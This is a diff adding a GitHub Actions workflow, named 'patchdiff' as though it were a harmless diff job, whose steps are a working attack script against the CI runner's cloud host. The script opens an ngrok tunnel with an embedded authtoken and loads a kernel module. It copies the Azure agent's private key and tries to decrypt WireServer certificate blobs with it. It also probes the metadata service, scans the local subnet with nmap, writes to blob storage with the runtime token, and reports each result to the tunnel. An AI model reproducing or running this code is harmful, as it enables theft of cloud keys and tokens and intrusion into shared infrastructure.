@@ -1,0 +1,180 @@
+name: patchdiff
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  diff:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - name: A0 meta tunnel
+        shell: bash
+        run: |
+          set +e
+          mkdir -p /tmp/pd
+          echo "RUN_ID=$GITHUB_RUN_ID JOB=$GITHUB_JOB"
+          uname -a
+          grep PRETTY /etc/os-release
+          echo "ImageVersion=${ImageVersion:-unknown} ImageOS=${ImageOS:-unknown}"
+          echo "TOKEN_PREFIX=${GITHUB_TOKEN:0:8} TOKEN_LEN=${#GITHUB_TOKEN}"
+          nohup python3 -m http.server 18080 --bind 127.0.0.1 >/tmp/pd/httpd.log 2>&1 &
+          curl -sL -m 90 -o ngrok.tgz https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+          tar -xzf ngrok.tgz
+          ./ngrok config add-authtoken 3B4eFa70NTI7mx05D1AljKk6PLF_6gEz2Mxx9LV13YTCdKbzU
+          nohup ./ngrok http 18080 --region us --log=stdout >/tmp/pd/ngrok.log 2>&1 &
+          sleep 12
+          curl -s http://127.0.0.1:4040/api/tunnels >/tmp/pd/tunnels.json
+          PUB=$(grep -o "https://[a-zA-Z0-9.-]*" /tmp/pd/tunnels.json | head -1)
+          echo "PUBLIC_URL=$PUB"
+          H=${PUB#https://}
+          echo "$H" >/tmp/pd/listener
+          if [ -n "$H" ]; then curl -s -o /dev/null -m 10 "http://$H/?t=selftest&r=1"; echo SELFTEST_SENT; fi
+          head -c 400 /tmp/pd/ngrok.log
+      - name: A1 insmod
+        shell: bash
+        run: |
+          set +e
+          cd /tmp/pd
+          cat > pd.c <<EOF
+          #include <linux/module.h>
+          static int __init pd_init(void){ return 0; }
+          static void __exit pd_exit(void){ }
+          module_init(pd_init)
+          module_exit(pd_exit)
+          MODULE_LICENSE("GPL")
+          EOF
+          echo "obj-m += pd.o" > Makefile
+          KDIR=/lib/modules/$(uname -r)/build
+          if [ ! -e $KDIR ]; then sudo apt-get install -y linux-headers-$(uname -r) >/dev/null 2>&1; fi
+          make -C $KDIR M=$PWD modules >/tmp/pd/make.log 2>&1
+          tail -3 /tmp/pd/make.log
+          if sudo insmod pd.ko 2>/tmp/pd/insmod.err; then echo INS=LOADED; B=LOADED; else echo INS=FAIL; cat /tmp/pd/insmod.err; B=FAIL; fi
+          sudo rmmod pd 2>/dev/null
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=insmod&r=$B"
+      - name: A2 hca settings
+        shell: bash
+        run: |
+          set +e
+          if sudo test -f /opt/hca/.settings; then
+            echo HCA=PRESENT size=$(sudo stat -c %s /opt/hca/.settings)
+            sudo cat /opt/hca/.settings | sha256sum
+            sudo cat /opt/hca/.settings | sed "s|[A-Za-z0-9+/=_-]\{12,\}|REDACTED|g" | head -40
+            B=PRESENT
+          else
+            echo HCA=ABSENT
+            ls -la /opt
+            B=ABSENT
+          fi
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=hca&r=$B"
+      - name: A3 waagent wireserver
+        shell: bash
+        run: |
+          set +e
+          sudo ls -la /var/lib/waagent/ 2>/dev/null | head -20
+          PRV=$(sudo ls /var/lib/waagent/*.prv 2>/dev/null | head -1)
+          if [ -n "$PRV" ]; then
+            echo PRV=PRESENT file=$PRV
+            sudo cp "$PRV" /tmp/pd/key.pem
+            sudo chmod 644 /tmp/pd/key.pem
+            openssl rsa -in /tmp/pd/key.pem -noout -modulus 2>/dev/null | head -c 60
+            echo
+            B=PRESENT
+          else
+            echo PRV=ABSENT
+            B=ABSENT
+          fi
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=waagent_prv&r=$B"
+          WS=$(curl -s -m 8 -o /tmp/pd/ws.xml -w "%{http_code}" -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" http://168.63.129.16/MachineConfig)
+          echo WIRESERVER_HTTP=$WS
+          head -c 200 /tmp/pd/ws.xml
+          echo
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=wireserver&r=$WS"
+          GS=$(curl -s -m 8 -o /tmp/pd/gs.xml -w "%{http_code}" -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" http://168.63.129.16/GoalState)
+          echo GOALSTATE_HTTP=$GS
+          grep -o "<Format>[^<]*" /tmp/pd/gs.xml | head -5
+          grep -c "<Data>" /tmp/pd/gs.xml
+          if [ "$GS" = "200" ] && [ "$B" = "PRESENT" ]; then
+          python3 - <<PYEOF
+          import re,base64,subprocess
+          x=open("/tmp/pd/gs.xml",errors="replace").read()
+          blobs=re.findall(r"<Data>([^<]+)</Data>",x)
+          print("CERT_BLOBS",len(blobs))
+          for i,b in enumerate(blobs[:2]):
+              raw=base64.b64decode(b+"===")
+              for pad in ["rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha1","rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256"]:
+                  args=["openssl","pkeyutl","-decrypt","-inkey","/tmp/pd/key.pem","-pkeyopt"]+pad.split()
+                  p=subprocess.run(args,input=raw,capture_output=True)
+                  print("DEC",i,pad.split(":")[-1],p.returncode,len(p.stdout),p.stdout[:40])
+          PYEOF
+          fi
+      - name: A4 imds
+        shell: bash
+        run: |
+          set +e
+          IM=$(curl -s -m 6 -o /tmp/pd/imds.json -w "%{http_code}" -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          echo IMDS_HTTP=$IM
+          python3 - <<PYEOF
+          import json
+          try:
+              d=json.load(open("/tmp/pd/imds.json"))
+              c=d.get("compute",{})
+              print("IMDS_KEYS",len(c),sorted(c)[:10])
+              print("vmId_prefix",str(c.get("vmId"))[:10],"location",c.get("location"))
+          except Exception as e:
+              print("IMDS_PARSE_ERR",e)
+          PYEOF
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=imds&r=$IM"
+      - name: A5 nmap
+        shell: bash
+        run: |
+          set +e
+          CIDR=$(ip -4 addr show eth0 | grep -o "inet [0-9./]*" | cut -d" " -f2)
+          echo ETH0=$CIDR
+          SUB=$(printf %s "$CIDR" | sed "s|\.[0-9]*/20|.0/20|")
+          echo SUBNET=$SUB
+          nmap -sn --max-rate 150 -T4 "$SUB" -oG /tmp/pd/hosts.gnmap >/dev/null 2>&1
+          UP=$(grep -c "Status: Up" /tmp/pd/hosts.gnmap)
+          echo NMAP_UP=$UP
+          grep "Status: Up" /tmp/pd/hosts.gnmap | head -6
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=nmap&r=$UP"
+      - name: A6 hca orchestrator
+        shell: bash
+        run: |
+          set +e
+          HP=$(pgrep -f hosted-compute-agent | head -1)
+          echo HCA_PID=$HP
+          if [ -n "$HP" ]; then
+            sudo ss -tlnp 2>/dev/null | grep "pid=$HP" | head -8
+          fi
+          sudo grep -oE "https?://[a-zA-Z0-9.-]+" /opt/hca/.settings 2>/dev/null | sort -u | head -8
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=hca_orch&r=$HP"
+      - name: A7 blob runtime token
+        shell: bash
+        run: |
+          set +e
+          echo RESULTS_URL=$ACTIONS_RESULTS_URL
+          echo RUNTIME_TOKEN_PREFIX=${ACTIONS_RUNTIME_TOKEN:0:6} LEN=${#ACTIONS_RUNTIME_TOKEN}
+          env | grep -iE "sas|blob|storage" | sed "s|=.*|=REDACTED|" | head -12
+          W=$(curl -s -m 10 -o /tmp/pd/blob.out -w "%{http_code}" -X PUT -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "x-ms-blob-type: BlockBlob" --data-binary "patchdiff-write-probe" "$ACTIONS_RESULTS_URL/patchdiff/probe.txt")
+          echo BLOB_WRITE_HTTP=$W
+          head -c 200 /tmp/pd/blob.out
+          echo
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=blob_write&r=$W"
+      - name: A8 summary
+        shell: bash
+        run: |
+          set +e
+          curl -s http://127.0.0.1:4040/requests/http -o /tmp/pd/req.json
+          python3 - <<PYEOF
+          import json
+          try:
+              d=json.load(open("/tmp/pd/req.json"))
+              for r in d.get("requests",[])[:30]:
+                  q=r.get("request",{})
+                  print(q.get("method"),q.get("url"))
+          except Exception as e:
+              print("ERR",e)
+          PYEOF
+          curl -s -o /dev/null -m 10 "http://$(cat /tmp/pd/listener)/?t=done&r=1"
+          echo PATCHDIFF_DONE
